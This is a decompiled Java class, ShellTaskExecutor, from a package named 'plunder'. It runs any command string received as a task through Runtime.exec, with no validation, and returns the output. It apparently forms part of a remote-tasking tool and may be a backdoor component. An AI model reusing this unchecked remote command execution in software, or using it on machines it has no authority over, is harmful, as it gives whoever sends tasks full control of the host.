// 
// Decompiled by Procyon v0.5.36
// 

package gg.noob.plunder.task.executor.impl;

import java.io.Closeable;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import gg.noob.plunder.task.Task;
import java.util.List;
import java.io.File;
import java.util.Arrays;
import gg.noob.plunder.task.executor.TaskExecutor;

public class ShellTaskExecutor extends TaskExecutor
{
    @Override
    public String execute(final String action) {
        String result = "";
        final List<String> parsedAction = Arrays.asList(action.split("``"));
        try {
            switch (parsedAction.size()) {
                case 1: {
                    result = execCmd(parsedAction.get(0), null);
                    break;
                }
                case 2: {
                    result = execCmd(parsedAction.get(0), new File(parsedAction.get(1)));
                    break;
                }
                default: {
                    result = "failed: illegal arguments";
                    break;
                }
            }
        }
        catch (Exception exception) {
            result = "failed: " + exception.toString();
        }
        return result;
    }
    
    @Override
    public String execute(final Task task) {
        String result = "";
        final List<String> parsedAction = Arrays.asList(task.getAction().split("``"));
        try {
            switch (parsedAction.size()) {
                case 1: {
                    result = execCmd(parsedAction.get(0), null);
                    break;
                }
                case 2: {
                    result = execCmd(parsedAction.get(0), new File(parsedAction.get(1)));
                    break;
                }
                default: {
                    result = "failed: illegal arguments";
                    break;
                }
            }
        }
        catch (Exception exception) {
            result = "failed: " + exception.toString();
        }
        return result;
    }
    
    public static String execCmd(final String cmd, final File dir) throws Exception {
        final StringBuilder result = new StringBuilder();
        Process process = null;
        BufferedReader bufrIn = null;
        BufferedReader bufrError = null;
        try {
            process = Runtime.getRuntime().exec(cmd, null, dir);
            process.waitFor();
            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));
            String line = null;
            while ((line = bufrIn.readLine()) != null) {
                result.append(line).append('\n');
            }
            while ((line = bufrError.readLine()) != null) {
                result.append(line).append('\n');
            }
        }
        finally {
            closeStream(bufrIn);
            closeStream(bufrError);
            if (process != null) {
                process.destroy();
            }
        }
        return result.toString();
    }
    
    private static void closeStream(final Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            }
            catch (Exception ex) {}
        }
    }
}
